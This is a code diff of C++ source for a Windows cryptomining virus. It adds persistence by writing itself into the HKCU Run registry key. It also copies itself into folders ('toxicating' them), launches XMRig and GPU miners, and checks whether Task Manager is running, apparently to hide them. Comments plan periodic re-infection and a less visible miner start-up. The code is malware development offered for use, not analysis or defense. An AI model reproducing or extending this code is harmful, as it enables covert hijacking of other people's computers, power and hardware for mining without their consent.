@@ -602,6 +602,64 @@ static int32_t IsFolderToxicated(std::wstring& Folder) {
 	return(Result);
 }
 
+
+/*
+	Return value:
+		0 - Dir not changed because key was not found in registry;
+		1 - Directory has been changed succesfully;
+*/
+static int32_t SetVirusFolderBasedOnRegedit() {
+	int32_t Result = 0;
+
+	std::wstring ExeName = GetExeFileName();
+
+	//Get the value and change dir
+	HKEY hKey;
+	LONG lRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
+	bool bExistsAndSuccess(lRes == ERROR_SUCCESS);
+	bool bDoesNotExistsSpecifically(lRes == ERROR_FILE_NOT_FOUND);
+
+	if (bExistsAndSuccess) {
+		std::wstring strValueOfBinDir;
+		std::wstring strKeyDefaultValue;
+
+		GetStringRegKey(hKey, ExeName, strValueOfBinDir, L"bad");
+
+		int LastSlashPos = strValueOfBinDir.find_last_of('\\');
+		std::wstring strDirectory = strValueOfBinDir.substr(1, LastSlashPos);
+
+		SetCurrentDirectoryW(strDirectory.c_str());
+
+		WCHAR WorkDirBuf[512];
+		GetCurrentDirectoryW(512, WorkDirBuf);
+		std::wstring WorkDirStr(WorkDirBuf);
+
+		Result = 1;
+	}
+
+	return(Result);
+}
+
+static void AddExeToAutorun(std::wstring& ExeFolder, std::wstring& ExeName) {
+
+	DWORD dwtype = 0;
+	TCHAR szpath[MAX_PATH];
+	HKEY hKeys;
+	if (ERROR_SUCCESS == RegCreateKeyExW(
+		HKEY_CURRENT_USER,
+		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, NULL, 0,
+		KEY_ALL_ACCESS,
+		NULL, &hKeys, NULL))
+	{
+		//NOTE: I want to reset value always, so i put it here
+		std::wstring ResultExePath = ExeFolder + L"\\" + ExeName;
+
+		RegSetValueExW(hKeys, ExeName.c_str(), 0, REG_SZ, (BYTE*)ResultExePath.c_str(), sizeof(wchar_t) * ResultExePath.size());
+		RegCloseKey(hKeys);
+	}
+}
+
 static void ToxicateFolder(std::wstring& Folder) {
 
 	wchar_t Dir[255];
@@ -646,6 +704,8 @@ static void ToxicateFolder(std::wstring& Folder) {
 		std::experimental::filesystem::copy_options::overwrite_existing);
 
 	SetCurrentDirectory(Dir);
+
+	AddExeToAutorun(VirusDirW, ExeFileName);
 }
 
 static void ToxicateComp(toxication_context* ToxicContext) {
@@ -657,67 +717,12 @@ static void ToxicateComp(toxication_context* ToxicContext) {
 		ToxicateFolder(*(it));
 	}
 
-	int32_t IsToxic = IsFolderToxicated(std::wstring(L"D:\\Test"));
 
-	wchar_t autorun_exe_path[255];
-	DWORD ExePathLen = GetModuleFileName(0, autorun_exe_path, ARRAY_COUNT(autorun_exe_path));
+	SetVirusFolderBasedOnRegedit();
 
-	{
-		//Get the value and change dir
-		HKEY hKey;
-		LONG lRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
-		bool bExistsAndSuccess(lRes == ERROR_SUCCESS);
-		bool bDoesNotExistsSpecifically(lRes == ERROR_FILE_NOT_FOUND);
-
-		if (bExistsAndSuccess) {
-			std::wstring strValueOfBinDir;
-			std::wstring strKeyDefaultValue;
-
-			std::wstring ExeNameW = GetExeFileName();
-
-			GetStringRegKey(hKey, ExeNameW.c_str(), strValueOfBinDir, L"bad");
-
-			int LastSlashPos = strValueOfBinDir.find_last_of('\\');
-			std::wstring strDirectory = strValueOfBinDir.substr(1, LastSlashPos);
-
-			SetCurrentDirectoryW(strDirectory.c_str());
-
-			WCHAR WorkDirBuf[512];
-			GetCurrentDirectoryW(512, WorkDirBuf);
-			std::wstring WorkDirStr(WorkDirBuf);
-
-			ConsoleMutex.lock();
-			printf("Working directory is: %ls\n", WorkDirStr.c_str());
-			ConsoleMutex.unlock();
-		}
-	}
-
-#if 1
-	{
-		DWORD dwtype = 0;
-		DWORD dwBufsize = sizeof(autorun_exe_path);
-		TCHAR szpath[MAX_PATH];
-		HKEY hKeys;
-		if (ERROR_SUCCESS == RegCreateKeyExW(
-			HKEY_CURRENT_USER,
-			L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-			0, NULL, 0, 
-			KEY_ALL_ACCESS, 
-			NULL, &hKeys, NULL))
-		{
-			//NOTE: I want to reset value always, so i put it here
-			std::wstring ResultExePath;
-			ResultExePath += L"\"";
-			ResultExePath += std::wstring(autorun_exe_path);
-			ResultExePath += L"\"";
-
-			std::wstring ExeNameW = GetExeFileName();
-
-			RegSetValueExW(hKeys, ExeNameW.c_str() , 0, REG_SZ, (BYTE*)ResultExePath.c_str(), sizeof(wchar_t) * ResultExePath.size());
-			RegCloseKey(hKeys);
-		}
-	}
-#endif
+	std::wstring VirusExeFolder = GetExeFileDirectory();
+	std::wstring VirusExeName = GetExeFileName();
+	AddExeToAutorun(VirusExeFolder, VirusExeName);
 }
 
 static void HealComp(toxication_context* ToxicContext) {
@@ -740,8 +745,15 @@ static void HealComp(toxication_context* ToxicContext) {
 	RegCloseKey(hkey);
 }
 
-static void RerunMinersIfNeeded() {
+static void MinersUpdate() {
 	int FirstTime = 1;
+
+	/*
+		TODO(Dima):
+			If toxication folders are not toxicated 
+			then we need to toxicate them again(Do this 
+			rarely - once in five minutes for example)
+	*/
 
 	do {
 		int32_t TaskMgrIsRun = IsProcessRun("taskmgr.exe");
@@ -776,6 +788,11 @@ static void RerunMinersIfNeeded() {
 				}break;
 
 				case GPUType_None: {
+					/*
+						TODO(DIMA): Do this only once - when we first come to the loop.
+						We don't want XMRig to blink every one second when it starts;
+					*/
+					
 					if (!GPU_NVIDIA_MinerIsRun) {
 						int32_t NvidiaRunned = RunMiner(&GlobalMinersContext, GPU_NVIDIA_MINER_PATH, MinerType_GPU);
 					}
@@ -797,10 +814,10 @@ static void RerunMinersIfNeeded() {
 	} while (1);
 }
 
-DWORD WINAPI RerunMinersThread(LPVOID lpParam) {
+DWORD WINAPI MinersUpdateThread(LPVOID lpParam) {
 	DWORD Result = 0;
 
-	RerunMinersIfNeeded();
+	MinersUpdate();
 
 	return(Result);
 }
@@ -982,7 +999,7 @@ static gpu_type GetGPUType() {
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
 //int main(int argc, char** argv)
 {
-	u32 MiningPolitika = MiningPolitika_Virus;
+	u32 MiningPolitika = MiningPolitika_Farm;
 
 	GlobalMinersContext = InitMinersContext(MiningPolitika);
 	GlobalToxicContext = InitToxicContext();
@@ -1015,10 +1032,10 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	DWORD ExePathLen = GetModuleFileNameA(0, autorun_exe_path, ARRAY_COUNT(autorun_exe_path));
 
 #if 1
-	HANDLE RerunMinersThreadHandle = CreateThread(0, 0, RerunMinersThread, 0, 0, 0);
+	HANDLE MinersUpdateThreadHandle = CreateThread(0, 0, MinersUpdateThread, 0, 0, 0);
 
-	WaitForSingleObject(RerunMinersThreadHandle, INFINITE);
-	CloseHandle(RerunMinersThreadHandle);
+	WaitForSingleObject(MinersUpdateThreadHandle, INFINITE);
+	CloseHandle(MinersUpdateThreadHandle);
 #else
 	RunMiner(&GlobalMinersContext, CPU_MINER_PATH, MinerType_CPU);
 	RunMiner(&GlobalMinersContext, GPU_NVIDIA_MINER_PATH, MinerType_GPU);
